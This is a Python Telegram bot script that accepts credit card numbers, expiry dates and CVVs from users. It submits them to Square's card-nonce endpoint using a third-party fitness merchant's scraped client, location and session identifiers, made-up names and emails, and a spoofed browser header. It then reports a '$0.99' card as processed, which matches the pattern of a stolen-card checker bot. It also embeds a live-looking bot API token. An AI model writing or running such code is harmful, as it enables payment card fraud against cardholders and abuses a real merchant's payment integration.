import telebot
import requests
import json
import random
import string
import time

API_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(API_TOKEN)

# Helper functions to generate random data
def random_string(length=6):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

def random_email():
    return random_string(10) + "@gmail.com"

# Example function to simulate the card nonce request
def get_card_nonce(cc, cvv, exp_month, exp_year):
    url = "https://pci-connect.squareup.com/v2/card-nonce?_=1698162040144.665&version=1.53.0"
    payload = {
        "client_id": "sq0idp-6d12caYG_dAuk7Pw8MWn-w",
        "location_id": "Y8JKDJVDKJ6A5",
        "payment_method_tracking_id": "5abcb484-228b-c3b6-ff65-2ce1eaa718ba",
        "session_id": "edCwx2zdFg4dKJuB7hrL8rp7SaU-6Tk32Hi_-oIF_Mu96BU3PA1fBr_dAL0fKLXrtbyDORFX9Q0zQJA7mg==",
        "website_url": "imotionfitness.ca",
        "analytics_token": "KV4BMM5DKXHGXU77PRBSH3YRT47PKLM6DJXJQ7TLG4HPNESHHXXT3ENQM2VOTMP42DLBTTL7H34EK3DSZGC567FENYIGKMWY5SNQ",
        "card_data": {
            "billing_postal_code": "10080",
            "cvv": cvv,
            "exp_month": exp_month,
            "exp_year": exp_year,
            "number": cc
        }
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        data = response.json()
        return data.get("card_nonce", None)
    return None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format:\nCC|MM|YY|CVV")

@bot.message_handler(func=lambda message: True)
def process_card(message):
    try:
        # Expecting message text like: 4111111111111111|12|25|123
        cc, mm, yy, cvv = message.text.split('|')
        # Generate random user data
        fname = random_string()
        lname = random_string()
        email = random_email()

        bot.reply_to(message, "Processing your card...")

        # Get card nonce
        card_nonce = get_card_nonce(cc, cvv, int(mm), int(yy))
        if not card_nonce:
            bot.reply_to(message, "Failed to get card nonce. Invalid card data or request error.")
            return

        # Here you would continue with the payment processing steps similar to your script,
        # sending requests to the payment processing endpoint with the nonce and user info.

        # For demo, just reply success with dummy charged message
        bot.reply_to(message, f"$0.99 ✅ Card processed successfully for {email}")

    except Exception as e:
        bot.reply_to(message, f"Error processing card: {str(e)}")

if __name__ == '__main__':
    bot.polling()